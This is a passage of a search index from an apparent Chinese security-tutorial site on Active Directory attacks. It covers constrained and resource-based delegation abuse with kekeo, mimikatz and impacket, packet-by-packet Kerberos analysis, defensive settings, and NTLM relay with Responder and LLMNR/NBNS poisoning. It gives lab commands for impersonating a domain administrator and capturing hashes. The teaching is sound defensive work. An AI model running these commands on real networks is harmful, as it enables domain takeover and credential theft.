/tgt:TGT_hack@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi /user:test@xie.com /service:cifs/AD01.xie.com\ntgs::s4u /tgt:TGT_server_account@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi /user:administrator@xie.com /service:cifs/AD01.xie.com\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 kekeo \u8fdb\u884c\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\uff0c\u5176\u4f1a\u751f\u6210\u4e09\u4e2a\u7968\u636e\u3002</p> <p></p> <p>\u7136\u540e\u4f7f\u7528 mimikatz \u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5c06\u6700\u540e\u7684 s4u2proxy \u6b65\u9aa4\u751f\u6210\u7684 ST \u670d\u52a1\u7968\u636e\u5bfc\u5165\u5185\u5b58\u4e2d\uff0c\u5373\u53ef\u8bbf\u95ee\u57df\u63a7\u7684 CIFS \u670d\u52a1\u3002</p> <pre><code>kerberos::ptt TGS_test@xie.com@XIE.COM_cifs~AD01.xie.com@XIE.COM.kirbi\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 mimikatz \u5c06\u7968\u636e\u5bfc\u5165\u5185\u5b58\u4e2d\u540e\uff0c\u5373\u53ef\u8fdc\u7a0b\u8bbf\u95ee\u57df\u63a7\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3_3","title":"\uff083\uff09\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u6293\u5305\u5206\u6790","text":"<p>\u4e0b\u9762\u6211\u4eec\u5bf9\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u8fdb\u884c\u6293\u5305\u5206\u6790\u3002\u5728\u8fdb\u884c\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u65f6\uff0c\u4f7f\u7528 WireShark \u8fdb\u884c\u6293\u5305\uff0c\u5982\u56fe\u6240\u793a\uff0c\u4e00\u5171\u6709 6 \u4e2a\u5305\u3002</p> <p></p> <p>\u524d\u9762\u4e24\u4e2a AS-REQ&amp;AS-REP \u6570\u636e\u5305\uff0c\u5c31\u662f\u4ee5\u670d\u52a1\u8d26\u53f7 hack \u7684\u8eab\u4efd\u5411\u57df\u63a7\u8bf7\u6c42\u53ef\u8f6c\u53d1\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u3002\u5bf9\u5e94\u7684\u5c31\u662f\u7b2c\u4e00\u6761\u547d\u4ee4\u3002</p> <pre><code>tgt::ask /user:hack /domain:xie.com /password:P@ss1234\n</code></pre> <p>\u540e\u9762\u56db\u4e2a TGS-REQ&amp;TGS-REP \u7684\u6570\u636e\u5305\u5bf9\u5e94\u7684\u5c31\u662f\u7b2c\u4e8c\u6761\u547d\u4ee4\u3002\u4f7f\u7528\u7b2c\u4e00\u6b65\u83b7\u53d6\u5230\u7684\u53ef\u8f6c\u53d1\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u5411\u57df\u63a7\u7533\u8bf7\u5177\u6709\u6307\u5b9a\u7528\u6237(test)\u6743\u9650\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1(cifs/AD01.xie.com)\u7684 ST \u670d\u52a1\u7968\u636e\u3002</p> <pre><code>tgs::s4u /tgt:TGT_hack@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi /user:test@xie.com /service:cifs/AD01.xie.com\n</code></pre>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1as-req","title":"1\uff09AS-REQ","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e00\u4e2a AS-REQ \u8bf7\u6c42\u5305\uff0c\u4ee5 hack \u7528\u6237\u8eab\u4efd\u5411 KDC \u8bf7\u6c42\u53ef\u8f6c\u53d1\u7684TGT \u8ba4\u8d2d\u6743\u8bc1\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2as-rep","title":"2\uff09AS-REP","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e8c\u4e2a AS-REP \u56de\u590d\u5305\uff0cKDC \u8fd4\u56de\u53ef\u8f6c\u53d1\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u4e5f\u5c31\u662f <code>TGT_hack@XIE.COM_krbtgt~xie.com@XIE.COM.kirbi</code></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3tgs-req","title":"3\uff09TGS-REQ","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e09\u4e2a TGS-REQ \u8bf7\u6c42\u5305\uff0c\u9700\u8981\u7528\u5230\u4e0a\u4e00\u6b65\u5f97\u5230\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\uff0c\u4ee5 test \u7684\u8eab\u4efd\u5411 TGS \u670d\u52a1\u7533\u8bf7\u4e86\u4e00\u5f20\u8bbf\u95ee\u81ea\u8eab\u670d\u52a1(hack \u670d\u52a1\u8d26\u53f7\u6240\u5728\u7684\u670d\u52a1)\u7684 ST \u7968\u636e\uff0c\u8fd9\u4e00\u6b65\u5bf9\u4e8e\u7684\u5c31\u662f <code>S4U2Self</code>\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#4tgs-rep","title":"4\uff09TGS-REP","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u56db\u4e2a TGS-REP \u56de\u590d\u5305\uff0cKDC \u8fd4\u56de\u4e86 test \u7528\u6237\u8bbf\u95ee\u81ea\u8eab\u670d\u52a1(hack \u670d\u52a1\u8d26\u53f7\u6240\u5728\u7684\u670d\u52a1)\u7684 \u53ef\u8f6c\u53d1 ST \u670d\u52a1\u7968\u636e\uff0c\u670d\u52a1\u7aef\u4e3a hack\uff0c\u4e5f\u5c31\u662f<code>TGS_test@xie.com@XIE.COM_hack@XIE.COM.kirbi</code></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#5tgs-req","title":"5\uff09TGS-REQ","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e94\u4e2a TGS-REQ \u8bf7\u6c42\u5305\uff0chack \u5f97\u5230<code>TGS_test@xie.com@XIE.COM_hack@XIE.COM.kirbi</code> \u7968\u636e\u540e\uff0c\u4f1a\u5728 TGS-REQ\u7684 <code>additional-tickets</code> \u5904\u5e26\u4e0a\u8be5\u7968\u636e\uff0c\u518d\u6b21\u5411 KDC \u53d1\u8d77 S4U2Proxy \u8bf7\u6c42\uff0c\u4ee5test \u7684\u540d\u4e49\u8bf7\u6c42\u4e00\u5f20\u8bbf\u95ee\u57df\u63a7 AD01 CIFS \u670d\u52a1\u7684\u7968\u636e\u3002\u8fd9\u4e00\u6b65\u5bf9\u5e94\u7684\u5c31\u662f<code>S4U2Proxy</code></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#6tgs-rep","title":"6\uff09TGS-REP","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u516d\u4e2a TGS-REP \u56de\u590d\u5305\uff0c\u5c31\u662f KDC \u8fd4\u56de\u7684\u4ee5 test \u8eab\u4efd\u8bbf\u95ee\u57df\u63a7AD01 \u7684 CIFS \u670d\u52a1\u7684 ST \u7968\u636e<code>TGS_test@xie.com@XIE.COM_cifs~AD01.xie.com@XIE.COM.kirbi</code></p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3_4","title":"3.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb","text":"<p>\u4ee5\u4e0b\u662f\u5b9e\u9a8c\u73af\u5883\uff1a</p> <ul> <li>\u57df\u63a7\uff1aAD01 (10.211.55.4) </li> <li>\u57df\u6210\u5458\u4e3b\u673a\uff1aWin2008 (10.211.55.7) </li> <li>\u57df\u7528\u6237\uff1ahack</li> <li>\u57df\u7ba1\u7406\u5458\uff1aadministrator </li> <li>\u57df\uff1axie.com</li> </ul> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u62ff\u5230\u4e86\u57df\u5185\u4e00\u53f0\u4e3b\u673a (win2008) \u7684\u666e\u901a\u57df\u8d26\u53f7\u6743\u9650\uff08xie\\hack\uff09\uff0c\u4f46\u662f\u8be5\u57df\u7528\u6237\u4e0d\u5728 win2008 \u7684\u7ba1\u7406\u5458\u7ec4\u4e2d\uff0c\u56e0\u6b64\u6211\u4eec\u65e0\u6cd5\u6267\u884cmimikatz \u7b49\u9ad8\u6743\u9650\u64cd\u4f5c\u3002\u73b0\u5728\u6211\u4eec\u9700\u8981\u5229\u7528\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e\u8fdb\u884c\u672c\u5730\u63d0\u6743\uff0c\u62ff\u5230 win2008 \u4e3b\u673a\u7684 system \u6743\u9650\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u901a\u8fc7 LDAP \u534f\u8bae\u67e5\u8be2\u57df\u5185\u673a\u5668\u8d26\u53f7\u7684\u521b\u5efa\u8005\uff0c\u6211\u4eec\u53d1\u73b0\uff0c\u673a\u5668win2008.xie.com \u7684\u521b\u5efa\u8005\u4e3a hack \u7528\u6237\uff0c\u4e5f\u5c31\u662f\u5f53\u524d\u767b\u5f55\u7684\u7528\u6237\u3002</p> <p></p> <p>\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u4e00\u4e2a\u673a\u5668\u8d26\u53f7 machine\uff0c\u7136\u540e\u914d\u7f6e\u65b0\u5efa\u7684\u673a\u5668\u8d26\u53f7machine \u5230 win2008 \u673a\u5668\u7684\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u3002\u8be6\u7ec6\u914d\u7f6e\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u914d\u7f6e\u6210\u529f\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1-impacket_1","title":"\uff081\uff09\u4f7f\u7528 impacket \u653b\u51fb","text":"<p>\u9996\u5148\uff0c\u9700\u8981\u628a\u653b\u51fb\u673a\u7684<code>/etc/resolv.conf</code> \u6587\u4ef6\u4e2d\u7684 DNS \u670d\u52a1\u5668\u6307\u5b9a\u4e3a\u57df\u63a7\u3002\u7136\u540e\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u8fdb\u884c\u653b\u51fb\uff1a</p> <pre><code>#\u4ee5 administrator \u7684\u8eab\u4efd\u7533\u8bf7\u4e00\u5f20\u8bbf\u95ee cifs/win2008.xie.com \u670d\u52a1\u7684\u7968\u636e\npython3 getST.py -dc-ip AD01.xie.com xie.com/machine$:root -spn cifs/win2008.xie.com -impersonate administrator\n#\u5bfc\u5165\u7968\u636e\nexport KRB5CCNAME=administrator.ccache\npython3 smbexec.py -no-pass -k win2008.xie.com\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6267\u884c\u5b8c\u8fd9\u4e9b\u547d\u4ee4\u540e\uff0c\u6210\u529f\u83b7\u5f97 win2008 \u673a\u5668\u7684 System \u6743\u9650\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2_5","title":"\uff082\uff09\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u6293\u5305\u5206\u6790","text":"<p>\u4e0b\u9762\u6211\u4eec\u5bf9\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u8fdb\u884c\u6293\u5305\u5206\u6790\u3002\u5728\u8fdb\u884c\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u65f6\uff0c\u4f7f\u7528 WireShark \u8fdb\u884c\u6293\u5305\uff0c\u5982\u56fe\u6240\u793a\uff0c\u4e00\u5171\u6709 6 \u4e2a\u5305\u3002</p> <p></p> <p>\u524d\u9762\u4e24\u4e2a AS-REQ&amp;AS-REP \u6570\u636e\u5305\uff0c\u5c31\u662f\u4ee5\u673a\u5668\u8d26\u53f7 machine \u7684\u8eab\u4efd\u5411\u57df\u63a7\u8bf7\u6c42\u53ef\u8f6c\u53d1\u7684 TGT \u7968\u636e\u3002</p> <p>\u540e\u9762\u56db\u4e2a\u662f TGS-REQ&amp;TGS-REP \u7684\u6570\u636e\u5305\uff0c\u4f7f\u7528\u7b2c\u4e00\u6b65\u83b7\u53d6\u5230\u7684\u53ef\u8f6c\u53d1\u7684 TGT\u8ba4\u8d2d\u6743\u8bc1\u4ee5 administrator \u8eab\u4efd\u901a\u8fc7<code>S4u2Self</code>\u534f\u8bae\u8bbf\u95ee\u81ea\u8eab\uff0c\u83b7\u53d6\u5230\u4e0d\u53ef\u8f6c\u53d1\u7684ST \u670d\u52a1\u7968\u636e\u3002\u7136\u540e\u518d\u901a\u8fc7\u6b64\u4e0d\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u4ee5 administrator \u8eab\u4efd\u901a\u8fc7\u4ee5<code>S4u2Proxy</code>\u534f\u8bae\u7533\u8bf7\u8bbf\u95ee\u6307\u5b9a\u670d\u52a1(cifs/win2008.xie.com)\u7684\u53ef\u8f6c\u53d1 ST \u670d\u52a1\u7968\u636e\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#1as-req_1","title":"1\uff09AS-REQ","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e00\u4e2a AS-REQ \u8bf7\u6c42\u5305\uff0c\u4ee5\u673a\u5668\u8d26\u53f7 machine \u7528\u6237\u8eab\u4efd\u5411 KDC \u8bf7\u6c42\u53ef\u8f6c\u53d1\u7684 TGT \u7968\u636e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#2as-rep_1","title":"2\uff09AS-REP","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e8c\u4e2a AS-REP \u56de\u590d\u5305\uff0cKDC \u8fd4\u56de\u53ef\u8f6c\u53d1\u7684 TGT \u8ba4\u8d2d\u6743\u8bc1\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#3tgs-req_1","title":"3\uff09TGS-REQ","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e09\u4e2a TGS-REQ \u8bf7\u6c42\u5305\uff0c\u8fd9\u4e00\u6b65\u5c31\u662f S4U2Self \u9636\u6bb5\uff0c\u673a\u5668\u8d26\u53f7machine \u4ee5 administrator \u8eab\u4efd\u8bbf\u95ee\u81ea\u8eab\u670d\u52a1\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#4tgs-rep_1","title":"4\uff09TGS-REP","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u56db\u4e2a TGS-REP \u56de\u590d\u5305\uff0c\u8fd9\u91cc KDC \u8fd4\u56de\u4e0d\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u3002\u4f46\u662f\u5728\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u6d41\u7a0b\u4e2d\uff0c\u4e0d\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u4e5f\u662f\u53ef\u4ee5\u901a\u8fc7S4U2Proxy \u8f6c\u53d1\u5230\u5176\u4ed6\u670d\u52a1\u8fdb\u884c\u59d4\u6d3e\u8ba4\u8bc1\uff0c\u5e76\u4e14\u6700\u540e\u670d\u52a1\u8fd8\u4f1a\u8fd4\u56de\u4e00\u5f20\u53ef\u8f6c\u53d1\u7684ST \u670d\u52a1\u7968\u636e\uff01</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#5tgs-req_1","title":"5\uff09TGS-REQ","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u4e94\u4e2a TGS-REQ \u8bf7\u6c42\u5305\uff0c\u8fd9\u4e00\u6b65\u5c31\u662f S4U2Proxy \u9636\u6bb5\uff0c\u673a\u5668\u8d26\u53f7machine \u4ee5 administrator \u8eab\u4efd\u7533\u8bf7 cifs/win2008.xie.com \u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\uff0c\u5e26\u7740\u4e0a\u4e00\u6b65\u83b7\u53d6\u5230\u7684\u4e0d\u53ef\u8f6c\u53d1\u7684 ST \u670d\u52a1\u7968\u636e\u653e\u5728 additional_tickets \u91cc\u9762\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#6tgs-rep_1","title":"6\uff09TGS-REP","text":"<p>\u5982\u56fe\u6240\u793a\uff0c\u662f\u7b2c\u516d\u4e2a TGS-REP \u56de\u590d\u5305\uff0cKDC \u8fd4\u56de\u4ee5 administrator \u8eab\u4efd\u8bbf\u95eecifs/win2008.xie.com \u670d\u52a1\u7684 ST \u670d\u52a1\u7968\u636e\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article5/index.html#_8","title":"\u57df\u59d4\u6d3e\u653b\u51fb\u9632\u8303\u63aa\u65bd","text":"<ul> <li>\u9ad8\u6743\u9650\u7684\u7528\u6237\uff0c\u8bbe\u7f6e\u4e0d\u80fd\u88ab\u59d4\u6d3e\uff0c\u5982\u56fe\u6240\u793a\uff0c\u8bbe\u7f6e administrator \u7528\u6237\u4e0d\u80fd\u88ab\u59d4\u6d3e\u3002</li> <li>\u4e3b\u673a\u8d26\u53f7\u9700\u8bbe\u7f6e\u59d4\u6d3e\u65f6\uff0c\u53ea\u80fd\u8bbe\u7f6e\u4e3a\u7ea6\u675f\u6027\u59d4\u6d3e\uff1b</li> <li>Windows 2012 R2 \u53ca\u66f4\u9ad8\u7684\u7cfb\u7edf\u5efa\u7acb\u4e86\u53d7\u4fdd\u62a4\u7684\u7528\u6237\u7ec4 ProtectedUsers\uff0c\u8be5\u7ec4\u5185\u7684\u7528\u6237\u4e0d\u5141\u8bb8\u88ab\u59d4\u6d3e\u3002\u5c06\u9700\u8981\u88ab\u4fdd\u62a4\u7684\u670d\u52a1\u7528\u6237\u52a0\u5165\u8be5\u7ec4\u4e2d\u5373\u53ef\u3002</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html","title":"NTLM Relay \u653b\u51fb","text":"<p>NTLM Relay \u653b\u51fb\u5176\u5b9e\u5e94\u8be5\u53eb <code>Net-NTLM Relay</code> \u653b\u51fb\uff0c\u5b83\u53d1\u751f\u5728 NTLM \u8ba4\u8bc1\u7684\u7b2c\u4e09\u6b65\uff0c\u5728<code>Response</code>\u6d88\u606f\u4e2d\u5b58\u5728 <code>Net-NTLM Hash</code>\uff0c\u5f53\u653b\u51fb\u8005\u83b7\u5f97\u4e86 Net-NTLMHash \u540e\uff0c\u53ef\u4ee5\u91cd\u653e Net-NTLM Hash \u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u8fd9\u5c31\u662f\u5927\u5bb6\u5e38\u8bf4\u7684 NTLMRelay(NTLM \u4e2d\u7ee7)\u653b\u51fb\u3002</p> <p>\u5982\u56fe\u6240\u793a\u662f NTLM Relay \u6d41\u7a0b\u56fe\uff0c\u653b\u51fb\u8005\u4f5c\u4e3a\u4e2d\u95f4\u4eba\u5728\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u8f6c\u53d1NTLM \u8ba4\u8bc1\u6570\u636e\u5305\uff0c\u4ece\u800c\u6a21\u62df\u5ba2\u6237\u7aef\u8eab\u4efd\u8bbf\u95ee\u670d\u52a1\u7aef\u7684\u8d44\u6e90\u3002</p> <p></p> <p>NTLM Relay \u653b\u51fb\u5206\u4e3a\u4e24\u6b65\uff1a</p> <ul> <li>\u7b2c\u4e00\u6b65\u662f\u6355\u83b7 Net-NTLM Hash</li> <li>\u7b2c\u4e8c\u6b65\u662f\u91cd\u653e Net-NTLM Hash</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#net-ntlm-hash","title":"\u6355\u83b7 Net-NTLM Hash","text":"<p>\u6355\u83b7 Net-NTLM Hash \u53c8\u6709\u4e24\u6b65\uff1a</p> <p>\u7b2c\u4e00\u6b65\u662f\u4f7f\u7528\u5de5\u5177\u6765\u76d1\u542c\u6355\u83b7\u76ee\u6807\u670d\u52a1\u5668\u53d1\u6765\u7684 NTLM \u8bf7\u6c42\uff0c\u4f7f\u7528<code>Responder</code>\u5de5\u5177\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u76d1\u542c\u5373\u53ef\uff1a</p> <pre><code>./Responder.py -i 10.211.55.2 -wrfv\n</code></pre> <p></p> <p>\u7b2c\u4e8c\u6b65\u662f\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u4e3b\u52a8\u5411\u653b\u51fb\u8005\u53d1\u8d77 NTLM \u8bf7\u6c42\uff0c\u5e38\u89c1\u7684\u65b9\u6cd5\u5982\u4e0b\uff1a</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1llmnrnbns","title":"1.LLMNR&amp;NBNS","text":"<p>LLMNR \u548c NBNS \u662f\u5c40\u57df\u7f51\u5185\u7684\u540d\u79f0\u89e3\u6790\u534f\u8bae\uff0c\u4e3b\u8981\u7528\u4e8e\u5c40\u57df\u7f51\u4e2d\u7684\u540d\u79f0\u89e3\u6790\u3002\u5f53\u5176\u4ed6\u65b9\u5f0f\u89e3\u6790\u5931\u8d25\u65f6\uff0cWindows \u7cfb\u7edf\u5c31\u4f1a\u4f7f\u7528 LLMNR \u548c NBNS \u534f\u8bae\u89e3\u6790\u540d\u79f0\u3002\u8fd9\u4e9b\u534f\u8bae\u53ea\u4e3a\u672c\u5730\u8fde\u63a5\u8bbe\u8ba1\u3002NetBIOS \u548c LLMNR \u5728 Windows Vista \u4ee5\u540e\u7684\u7cfb\u7edf\u4e2d\u5747\u5b9e\u73b0\u3002</p> <p>Windows \u7cfb\u7edf\u7684\u540d\u79f0\u89e3\u6790\u987a\u5e8f\u5982\u4e0b\uff1a</p> <ul> <li>\u672c\u5730 hosts \u6587\u4ef6\uff08%windir%\\System32\\drivers\\etc\\hosts\uff09</li> <li>DNS \u7f13\u5b58/DNS \u670d\u52a1\u5668</li> <li>\u94fe\u8def\u672c\u5730\u591a\u64ad\u540d\u79f0\u89e3\u6790\uff08LLMNR\uff09\u548c NetBIOS \u540d\u79f0\u670d\u52a1\uff08NBNS\uff09</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1llmnr","title":"\uff081\uff09LLMNR","text":"<p><code>LLMNR(Link-LocalMulticast NameResolution)</code>\uff1a\u94fe\u8def\u672c\u5730\u591a\u64ad\u540d\u79f0\u89e3\u6790(LLMNR)\uff0c\u662f\u4e00\u4e2a\u57fa\u4e8e\u57df\u540d\u7cfb\u7edf(DNS)\u6570\u636e\u5305\u683c\u5f0f\u7684\u534f\u8bae\uff0cLLMNR \u534f\u8bae\u5b9a\u4e49\u5728RFC4795 \u4e2d\u3002\u8be5\u534f\u8bae\u4f7f\u5f97\u5c40\u57df\u7f51\u5185\u7684 IPv4 \u548c IPv6 \u7684\u4e3b\u673a\u8fdb\u884c\u540d\u79f0\u89e3\u6790\u4e3a\u540c\u4e00\u672c\u5730\u94fe\u8def\u4e0a\u7684\u4e3b\u673a\uff0c\u56e0\u6b64\u4e5f\u79f0\u4f5c\u591a\u64ad DNS\u3002Windows \u64cd\u4f5c\u7cfb\u7edf\u4ece Windows Vist \u5f00\u59cb\u5c31\u5185\u5d4c\u652f\u6301 LLMNR \u534f\u8bae\uff0cLinux \u7cfb\u7edf\u4e5f\u901a\u8fc7 systemd \u5b9e\u73b0\u4e86\u6b64\u534f\u8bae\u3002LLMNR\u534f\u8bae\u76d1\u542c\u7684\u7aef\u53e3\u4e3a UDP \u7684 5355 \u7aef\u53e3\uff0c\u652f\u6301 IPv4 \u548c IPv6\u3002LLMNR \u534f\u8bae\u7c7b\u4f3c\u4e8eARP \u534f\u8bae\uff0c\u5176\u89e3\u6790\u540d\u79f0\u7684\u7279\u70b9\u4e3a\u7aef\u5230\u7aef\uff0cIPv4 \u7684\u591a\u64ad\u5730\u5740\u4e3a 224.0.0.252\uff0cIPv6\u591a\u64ad\u5730\u5740\u4e3a FF02::1:3\u3002\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 WireShark \u6293\u5305\u53ef\u4ee5\u770b\u5230 LLMNR \u534f\u8bae\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2nbns","title":"\uff082\uff09NBNS","text":"<p><code>NetBios(Network Basic Input Output System)</code>\uff1a\u7f51\u7edc\u57fa\u672c\u8f93\u5165\u8f93\u51fa\u7cfb\u7edf\uff0cNetBIOS \u534f\u8bae\u662f\u7531 IBM \u516c\u53f8\u5f00\u53d1\uff0c\u4e3b\u8981\u7528\u4e8e 20-200 \u53f0\u8ba1\u7b97\u673a\u7684\u5c40\u57df\u7f51\u3002NBNS\u534f\u8bae\u901a\u8fc7 UDP137 \u7aef\u53e3\u8fdb\u884c\u901a\u4fe1\uff0c\u4ec5\u652f\u6301 IPV4 \u4e0d\u652f\u6301 IPV6\u3002NBNS \u662f\u4e00\u79cd\u5e94\u7528\u7a0b\u5e8f\u63a5\u53e3(API)\uff0c\u7cfb\u7edf\u53ef\u4ee5\u5229\u7528 WINS \u670d\u52a1\u3001\u5e7f\u64ad\u53ca Lmhosts \u6587\u4ef6\u7b49\u591a\u79cd\u6a21\u5f0f\u5c06NetBIOS \u540d\u89e3\u6790\u4e3a\u76f8\u5e94 IP \u5730\u5740\uff0c\u51e0\u4e4e\u6240\u6709\u7684\u5c40\u57df\u7f51\u90fd\u662f\u5728 NetBIOS \u534f\u8bae\u7684\u57fa\u7840\u4e0a\u5de5\u4f5c\u7684\u3002\u5728 Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5728\u5b89\u88c5 TCP/IP \u534f\u8bae\u540e\u4f1a\u81ea\u52a8\u5b89\u88c5 NetBIOS\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#3llmnr-nbns","title":"\uff083\uff09LLMNR \u548c NBNS \u534f\u8bae\u7684\u533a\u522b\u548c\u8054\u7cfb","text":"<p>\u533a\u522b\uff1a</p> <ul> <li>NBNS \u57fa\u4e8e\u5e7f\u64ad\uff0c\u800c LLMNR \u57fa\u4e8e\u591a\u64ad</li> <li>NetBIOS \u5728 Windows NT \u4ee5\u540e\u7684\u6240\u6709\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u5747\u53ef\u7528\uff0c\u800c\u53ea\u6709 WindowsVista \u548c\u66f4\u9ad8\u7248\u672c\u624d\u652f\u6301 LLMNR\uff1b</li> <li>LLMNR \u8fd8\u652f\u6301 IPv6\uff0c\u800c NetBIOS \u4e0d\u652f\u6301 IPv6\u3002</li> </ul> <p>\u8054\u7cfb\uff1a</p> <ul> <li>\u4e24\u8005\u90fd\u662f\u5c40\u57df\u7f51\u5185\u7528\u4e8e\u89e3\u6790\u540d\u79f0\u7684\u534f\u8bae</li> </ul>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#4llmnrnbns","title":"\uff084\uff09LLMNR&amp;NBNS \u653b\u51fb","text":"<p>\u53ea\u8981\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u4efb\u610f\u7684\u4e0d\u5b58\u5728\u540d\u79f0\uff0c\u7531\u4e8e\u672c\u5730 hosts \u6587\u4ef6\u548c DNS \u670d\u52a1\u5668\u5747\u4e0d\u80fd\u6b63\u5e38\u89e3\u6790\u8be5\u540d\u79f0\uff0c\u4e8e\u662f\u7cfb\u7edf\u5c31\u4f1a\u53d1\u9001 LLMNR/NBNS \u6570\u636e\u5305\u8bf7\u6c42\u89e3\u6790\u3002\u653b\u51fb\u8005\u6536\u5230\u8bf7\u6c42\u540e\u544a\u8bc9\u5ba2\u6237\u7aef\u5b83\u662f\u8be5\u540d\u79f0\u5e76\u8981\u6c42\u5ba2\u6237\u7aef\u53d1\u9001 Net-NTLM Hash \u8fdb\u884c\u8ba4\u8bc1\uff0c\u4e8e\u662f\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u6536\u5230\u5ba2\u6237\u7aef\u53d1\u6765\u7684 Net-NTLMHash \u4e86\u3002</p> 